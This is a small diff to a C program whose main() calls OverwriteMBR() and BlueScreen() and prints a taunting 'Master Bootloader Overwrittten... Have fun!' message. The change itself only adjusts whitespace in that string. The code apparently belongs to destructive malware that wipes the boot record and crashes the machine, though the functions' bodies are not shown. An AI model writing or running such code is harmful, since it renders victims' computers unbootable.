@@ -57,7 +57,7 @@ int main()
 
     if (OverwriteMBR())
     {
-        printf("Master Bootloader Overwrittten. \n Have fun! :^) \n");
+        printf("Master Bootloader Overwrittten. \nHave fun! :^) \n");
     }
     
     BlueScreen();
